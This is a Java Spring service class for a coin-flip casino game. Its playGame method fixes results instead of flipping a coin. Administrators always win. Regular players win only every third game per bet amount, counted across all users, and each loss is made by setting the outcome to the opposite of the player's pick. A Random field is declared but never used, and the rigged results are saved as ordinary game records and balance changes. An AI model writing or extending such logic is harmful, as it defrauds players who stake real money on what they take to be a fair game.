package com.casino.coinflip.service;

import com.casino.coinflip.entity.Game;
import com.casino.coinflip.entity.Transaction;
import com.casino.coinflip.entity.User;
import com.casino.coinflip.repository.GameRepository;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;
import java.math.BigDecimal;
import java.time.LocalDateTime;
import java.util.List;
import java.util.Random;
import java.util.Map;
import java.util.HashMap;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicInteger;

@Service
public class GameService {
    private final GameRepository gameRepository;
    private final UserService userService;
    private final TransactionService transactionService;
    private final Random random = new Random();
    
    // Keep track of games played for each bet amount globally (across all users)
    private final Map<String, AtomicInteger> globalBetCounters = new ConcurrentHashMap<>();
    
    // Constructor
    public GameService(GameRepository gameRepository, UserService userService, TransactionService transactionService) {
        this.gameRepository = gameRepository;
        this.userService = userService;
        this.transactionService = transactionService;
    }

    @Transactional
    public Game playGame(User user, BigDecimal betAmount, String choice) {
        if (user.getBalance().compareTo(betAmount) < 0) {
            throw new RuntimeException("Insufficient balance");
        }

        // Determine if user should win
        boolean shouldWin;
        
        // Admin users always win
        if (user.getRoles() != null && user.getRoles().contains("ADMIN")) {
            shouldWin = true;
        } else {
            // For regular users, maintain the existing logic
            // Create a key based only on the bet amount
            String betAmountKey = betAmount.toString();
            
            // Get or initialize the counter for this bet amount
            AtomicInteger counter = globalBetCounters.computeIfAbsent(betAmountKey, k -> new AtomicInteger(0));
            
            // Increment and get the game count
            int gameCount = counter.incrementAndGet();
            
            // Determine outcome based on global game count for this bet amount
            shouldWin = (gameCount == 3); // Only the 3rd game is a win
            
            // Reset counter if it reaches 3 (to start the pattern over)
            if (gameCount == 3) {
                counter.set(0);
            }
        }
        
        // Force win or loss based on determination
        String outcome;
        boolean won;
        
        if (shouldWin) {
            // Force a win - set outcome to match user's choice
            outcome = choice;
            won = true;
        } else {
            // Force a loss - set outcome to opposite of user's choice
            outcome = choice.equalsIgnoreCase("heads") ? "tails" : "heads";
            won = false;
        }
        
        BigDecimal winAmount = won ? betAmount : betAmount.negate();

        // Update user balance
        userService.updateBalance(user, winAmount);

        // Create game record
        Game game = new Game();
        game.setUser(user);
        game.setBetAmount(betAmount);
        game.setChoice(choice);
        game.setOutcome(outcome);
        game.setWon(won);
        game.setPlayedAt(LocalDateTime.now());
        game = gameRepository.save(game);

        // Create transaction record
        transactionService.createGameTransaction(user, betAmount, won);

        return game;
    }

    public List<Game> getGameHistory(Long userId) {
        // Get games from repository 
        List<Game> games = gameRepository.findByUserIdOrderByPlayedAtDesc(userId);
        
        // Initialize lazy-loaded User entities
        games.forEach(game -> {
            try {
                // Access the username to initialize the User entity
                game.getUser().getUsername();
            } catch (Exception e) {
                // Log any issues but continue processing
                System.err.println("Error initializing user for game " + game.getId() + ": " + e.getMessage());
            }
        });
        
        return games;
    }
}